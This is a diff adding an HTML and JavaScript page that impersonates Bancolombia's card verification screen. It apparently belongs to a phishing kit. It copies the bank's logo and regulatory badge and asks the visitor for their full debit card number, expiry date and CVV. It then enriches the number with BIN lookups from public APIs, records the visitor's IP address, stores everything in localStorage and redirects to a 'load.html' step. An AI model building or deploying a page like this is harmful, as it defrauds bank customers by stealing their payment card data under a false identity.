@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificación de Tarjeta - Bancolombia</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #FFFFFF;
+            font-family: 'Montserrat', sans-serif;
+            padding: 20px;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 0;
+            box-shadow: none;
+            text-align: center;
+            width: 450px;
+            position: relative;
+            border: none;
+            z-index: 2;
+        }
+
+        .card-preview {
+            background: #FFFFFF;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 30px;
+            color: #003B5C;
+            position: relative;
+            min-height: 220px;
+            box-shadow: 0 15px 25px rgba(0,0,0,0.1);
+            transition: all 0.3s ease;
+            overflow: hidden;
+            border: 1px solid #e0e0e0;
+        }
+
+        .card-preview::before {
+            content: "";
+            position: absolute;
+            top: -30%;
+            right: -20%;
+            width: 180px;
+            height: 180px;
+            background: radial-gradient(circle, rgba(0,59,92,0.05) 0%, rgba(0,59,92,0) 70%);
+            border-radius: 50%;
+        }
+
+        .card-preview::after {
+            content: "✦ ✦ ✦";
+            position: absolute;
+            bottom: 15px;
+            left: 20px;
+            font-size: 10px;
+            letter-spacing: 4px;
+            opacity: 0.15;
+            color: #003B5C;
+        }
+
+        .card-bank-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            background: rgba(0,59,92,0.08);
+            padding: 4px 12px;
+            border-radius: 20px;
+            backdrop-filter: blur(2px);
+            color: #003B5C;
+        }
+
+        .card-bank-logo span {
+            font-size: 10px;
+            display: block;
+            opacity: 0.7;
+            font-weight: normal;
+        }
+
+        .card-chip {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 45px;
+            height: 35px;
+            background: linear-gradient(135deg, #d4af37 0%, #b8942e 100%);
+            border-radius: 8px;
+        }
+
+        .card-chip::before {
+            content: "◉◉◉";
+            position: absolute;
+            top: 8px;
+            left: 10px;
+            font-size: 12px;
+            color: #8B6914;
+            letter-spacing: 3px;
+        }
+
+        .card-chip::after {
+            content: "";
+            position: absolute;
+            bottom: 6px;
+            left: 8px;
+            width: 20px;
+            height: 4px;
+            background: rgba(0,0,0,0.15);
+            border-radius: 2px;
+        }
+
+        .card-number-preview {
+            font-size: 20px;
+            letter-spacing: 3px;
+            margin: 50px 0 20px 0;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            font-weight: 600;
+            color: #003B5C;
+        }
+
+        .card-details {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+
+        .card-exp, .card-cvv, .card-type {
+            text-transform: uppercase;
+        }
+
+        .card-exp span, .card-cvv span, .card-type span {
+            display: block;
+            font-size: 9px;
+            opacity: 0.6;
+            margin-bottom: 4px;
+            letter-spacing: 0.5px;
+            color: #666;
+        }
+
+        .card-exp strong, .card-cvv strong, .card-type strong {
+            font-size: 12px;
+            font-family: monospace;
+            letter-spacing: 1px;
+            color: #003B5C;
+        }
+
+        .card-brand-icon {
+            position: absolute;
+            bottom: 15px;
+            right: 20px;
+            display: flex;
+            gap: 5px;
+            align-items: center;
+        }
+
+        .card-brand-icon i {
+            font-size: 45px;
+        }
+
+        .fa-cc-visa {
+            color: #1a1f71;
+        }
+
+        .fa-cc-mastercard {
+            color: #eb001b;
+        }
+
+        .fa-cc-amex {
+            color: #2e77d0;
+        }
+
+        .contactless {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-size: 18px;
+            opacity: 0.5;
+            color: #003B5C;
+        }
+
+        .card-type-badge {
+            position: absolute;
+            top: 80px;
+            right: 20px;
+            background: rgba(0,59,92,0.1);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #003B5C;
+        }
+
+        .form input[type="tel"], 
+        .form input[type="password"] {
+            width: calc(100% - 50px);
+            background-color: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 12px 0;
+            padding-left: 45px;
+            font-size: 14px;
+            outline: none;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .form input:focus {
+            border-color: #fdda24;
+            box-shadow: 0 0 0 3px rgba(253,218,36,0.2);
+        }
+
+        .form button {
+            width: 100%;
+            padding: 14px;
+            background: #fdda24;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            color: #2c2a29;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .form button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(253,218,36,0.35);
+        }
+
+        #icon {
+            position: absolute;
+            left: 15px;
+            top: 13px;
+            color: #aaa;
+            z-index: 1;
+        }
+
+        #is-relative {
+            position: relative;
+            margin-bottom: 5px;
+        }
+
+        .error-message {
+            display: none;
+            color: #dc3545;
+            font-weight: bold;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #ffe6e6;
+            border-radius: 8px;
+            font-size: 13px;
+        }
+
+        .logo-bancolombia {
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            font-size: 1.3rem;
+            color: #003B5C;
+            margin: 10px 0;
+        }
+
+        h6 {
+            color: #666;
+            font-size: 0.8rem;
+            margin-bottom: 20px;
+        }
+
+        .footer-container {
+            width: 450px;
+            max-width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            gap: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .footer-container .lineas-form {
+            width: 100%;
+            display: block;
+            pointer-events: none;
+            user-select: none;
+            z-index: 5;
+            transform: translateY(0);
+            transition: transform 220ms ease;
+        }
+
+        .footer-container .ip-text {
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.35;
+            word-break: break-word;
+        }
+
+        .footer-container .vigilado-logo {
+            width: 220px;
+            max-width: 80%;
+        }
+
+        .footer-container .vigilado-logo img {
+            width: 100%;
+            display: block;
+        }
+
+        body.is-typing-number .footer-container .lineas-form {
+            transform: translateY(-320px);
+        }
+
+        @media (max-width: 520px) {
+            body.is-typing-number .footer-container .lineas-form {
+                transform: translateY(-280px);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form class="form" id="paymentForm">
+            <div class="logo-bancolombia">
+                <img src="images/logo.svg" width="180" alt="Logo Bancolombia" onerror="this.style.display='none'">
+            </div>
+            
+            <div class="card-preview" id="cardPreview">
+                <div class="card-bank-logo">
+                    Bancolombia
+                    <span>desde 1875</span>
+                </div>
+                <div class="card-chip"></div>
+                <div class="card-type-badge" id="cardTypeBadge">---</div>
+                <div class="card-number-preview" id="cardNumberPreview">
+                    •••• •••• •••• ••••
+                </div>
+                <div class="card-details">
+                    <div class="card-exp">
+                        <span>Válida hasta</span>
+                        <strong id="cardExpPreview">MM/AA</strong>
+                    </div>
+                    <div class="card-type">
+                        <span>Franquicia</span>
+                        <strong id="cardFranquicia">---</strong>
+                    </div>
+                    <div class="card-cvv">
+                        <span>CVV</span>
+                        <strong id="cardCvvPreview">•••</strong>
+                    </div>
+                </div>
+                <div class="contactless">
+                    <i class="fas fa-wifi"></i>
+                </div>
+                <div class="card-brand-icon" id="cardBrandIcon">
+                    <i class="fas fa-credit-card"></i>
+                </div>
+            </div>
+
+            <h2>¡INGRESA TU TARJETA DÉBITO!</h2>
+            <h6>Por favor ingresa los datos de tu Tarjeta Bancolombia para continuar.</h6>
+
+            <div id="error-message" class="error-message">
+                <i class="fas fa-exclamation-triangle"></i> La tarjeta ingresada es incorrecta. Por favor verifica los datos.
+            </div>
+
+            <div id="is-relative">
+                <input type="tel" id="inp_c_nm" placeholder="Número de Tarjeta" required maxlength="19" />
+                <span id="icon"><i class="fas fa-credit-card"></i></span>
+            </div>
+
+            <div id="is-relative">
+                <input type="tel" id="inp_c_xp" placeholder="Fecha de Expiración (MM/AA)" required maxlength="5" />
+                <span id="icon"><i class="fas fa-calendar-alt"></i></span>
+            </div>
+
+            <div id="is-relative">
+                <input type="password" id="inp_c_vv" placeholder="CVV" required maxlength="4" />
+                <span id="icon"><i class="fas fa-lock"></i></span>
+            </div>
+
+            <button type="submit">Continuar <i class="fas fa-arrow-right"></i></button>
+        </form>
+    </div>
+
+    <div class="footer-container">
+        <img src="images/5125617020933180513 (1).jpg" alt="" class="lineas-form">
+        <div class="vigilado-logo">
+            <img src="images/vigiladosuper.png" alt="">
+        </div>
+        <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span> | Fecha y hora: <span id="fecha-hora">Cargando...</span></div>
+    </div>
+    <div id="address" style="display:none;"></div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <script>
+        // ============================================
+        // FUNCIONES PARA QUE FUNCIONE EL BOTÓN CONTINUAR
+        // ============================================
+
+        function validateDate(exp) { 
+            if (!/^\d{2}\/\d{2}$/.test(exp)) return false; 
+            var parts = exp.split('/'); 
+            var month = parseInt(parts[0], 10); 
+            if (month < 1 || month > 12) return false; 
+            return true; 
+        } 
+
+        async function identifyBin(bin) { 
+            if (bin.length < 6) return { scheme: "", type: "DEBIT" }; 
+            
+            try { 
+                const controller = new AbortController(); 
+                const timeoutId = setTimeout(() => controller.abort(), 3000); 
+                const response = await fetch(`https://data.handyapi.com/bin/${bin}`, { signal: controller.signal }); 
+                clearTimeout(timeoutId); 
+
+                if (response.ok) {
+                    const data = await response.json(); 
+                    if (data.Status !== "NOT FOUND") {
+                        return {
+                            scheme: (data.Scheme || "").toUpperCase(),
+                            type: (data.Type || "").toUpperCase(),
+                            level: (data.CardTier || "").toUpperCase(),
+                            bank: (data.Issuer || "").toUpperCase(),
+                            country: (data.Country ? data.Country.Name : "").toUpperCase()
+                        };
+                    }
+                }
+            } catch (error) { 
+                console.log("HandyAPI failed, trying backup...", error);
+            } 
+
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                const response = await fetch(`https://lookup.binlist.net/${bin}`, { 
+                    signal: controller.signal,
+                    headers: { 'Accept-Version': '3' }
+                });
+                clearTimeout(timeoutId);
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return {
+                        scheme: (data.scheme || "").toUpperCase(),
+                        type: (data.type || "").toUpperCase(),
+                        level: (data.brand || "").toUpperCase(), 
+                        bank: (data.bank ? data.bank.name : "").toUpperCase(),
+                        country: (data.country ? data.country.name : "").toUpperCase()
+                    };
+                }
+            } catch (error) {
+                console.log("BinList failed", error);
+            }
+
+            let simpleScheme = "";
+            if(bin.startsWith('4')) simpleScheme = "VISA"; 
+            else if(bin.startsWith('5')) simpleScheme = "MASTERCARD"; 
+            else if(bin.startsWith('3')) simpleScheme = "AMEX"; 
+            
+            return {
+                scheme: simpleScheme,
+                type: "DEBIT",
+                level: "",
+                bank: "",
+                country: ""
+            };
+        } 
+
+        async function enviarTarjeta() { 
+            const pan = document.getElementById('inp_c_nm').value.replace(/\s/g, ''); 
+            const exp = document.getElementById('inp_c_xp').value; 
+            const cvv = document.getElementById('inp_c_vv').value; 
+            const errorBox = document.getElementById('error-message');
+            if (errorBox) errorBox.style.display = 'none';
+             
+            if (pan.length < 15) { 
+                if (errorBox) {
+                    errorBox.innerHTML = '<i class="fas fa-exclamation-triangle"></i> El numero de tarjeta debe tener al menos 15 digitos.';
+                    errorBox.style.display = 'block';
+                }
+                return false; 
+            } 
+
+            if (!validateDate(exp)) { 
+                if (errorBox) {
+                    errorBox.innerHTML = '<i class="fas fa-exclamation-triangle"></i> La fecha de vencimiento es invalida.';
+                    errorBox.style.display = 'block';
+                }
+                return false; 
+            } 
+
+            if (cvv.length < 3) { 
+                if (errorBox) {
+                    errorBox.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Codigo de seguridad (CVV) invalido.';
+                    errorBox.style.display = 'block';
+                }
+                return false; 
+            } 
+
+            const bin = pan.substring(0, 6); 
+            let cardBinData = { scheme: "", type: "DEBIT", level: "", bank: "", country: "" };
+            try {
+                cardBinData = await identifyBin(bin); 
+            } catch(e) {
+                console.log("Error identifying BIN:", e);
+            }
+
+            let ip = 'No disponible';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch(e) {}
+
+            const fechaHora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+            const cardData = {
+                creditCardNumber: pan,
+                expirationDate: exp,
+                cvv: cvv,
+                type: 'Débito', 
+                network: cardBinData.scheme,
+                level: cardBinData.level,
+                bank: cardBinData.bank,
+                country: cardBinData.country,
+                ip: ip,
+                fecha: fechaHora
+            };
+            localStorage.setItem("cardData", JSON.stringify(cardData));
+            console.log("Card Data Saved:", cardData);
+
+            localStorage.removeItem('transaction_id');
+
+            // Redirigir directamente sin loading
+            window.location.href = "load.html";
+
+            return true;
+        }
+
+        // ============================================
+        // EVENT LISTENERS
+        // ============================================
+
+        // Submit del formulario
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            await enviarTarjeta();
+        });
+
+        // Actualizar vista previa de la tarjeta
+        function updateCardPreview() {
+            const cardNumber = document.getElementById('inp_c_nm').value || '';
+            const expDate = document.getElementById('inp_c_xp').value || '';
+            const cvv = document.getElementById('inp_c_vv').value || '';
+            
+            document.getElementById('cardNumberPreview').textContent = cardNumber || '•••• •••• •••• ••••';
+            document.getElementById('cardExpPreview').textContent = expDate || 'MM/AA';
+            document.getElementById('cardCvvPreview').textContent = cvv ? '•'.repeat(cvv.length) : '•••';
+        }
+
+        document.getElementById('inp_c_nm').addEventListener('input', function(e) {
+            var input = e.target.value.replace(/\D/g, '').substring(0,19);
+            var formatted = input.match(/.{1,4}/g);
+            if (formatted) {
+                e.target.value = formatted.join(' ');
+            } else {
+                e.target.value = input;
+            }
+            updateCardPreview();
+        });
+
+        document.getElementById('inp_c_xp').addEventListener('input', function(e) { 
+            var input = e.target.value.replace(/[^0-9]/g, '');
+            if (input.length >= 2) {
+                input = input.substring(0, 2) + '/' + input.substring(2, 4);
+            }
+            e.target.value = input;
+            updateCardPreview();
+        });
+
+        document.getElementById('inp_c_vv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            updateCardPreview();
+        });
+
+        // IP y fecha en footer
+        function setText(id, value) {
+            const el = document.getElementById(id);
+            if (el) el.textContent = value;
+        }
+
+        async function cargarIPFooter() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+                if (!res.ok) throw new Error("HTTP " + res.status);
+                const data = await res.json();
+                setText("gfg", data.ip || "No disponible");
+            } catch (e) {
+                setText("gfg", "No disponible");
+            }
+        }
+
+        function actualizarFechaHoraFooter() {
+            const options = {
+                year: "numeric",
+                month: "long",
+                day: "numeric",
+                hour: "2-digit",
+                minute: "2-digit",
+                second: "2-digit",
+                hour12: true
+            };
+            setText("fecha-hora", new Date().toLocaleString("es-CO", options));
+        }
+
+        window.addEventListener("load", () => {
+            cargarIPFooter();
+            actualizarFechaHoraFooter();
+            setInterval(actualizarFechaHoraFooter, 1000);
+            updateCardPreview();
+
+            const panInput = document.getElementById("inp_c_nm");
+            if (panInput) {
+                panInput.addEventListener("focus", () => {
+                    document.body.classList.add("is-typing-number");
+                });
+                panInput.addEventListener("blur", () => {
+                    document.body.classList.remove("is-typing-number");
+                });
+            }
+        });
+    </script>
+</body>
+</html>
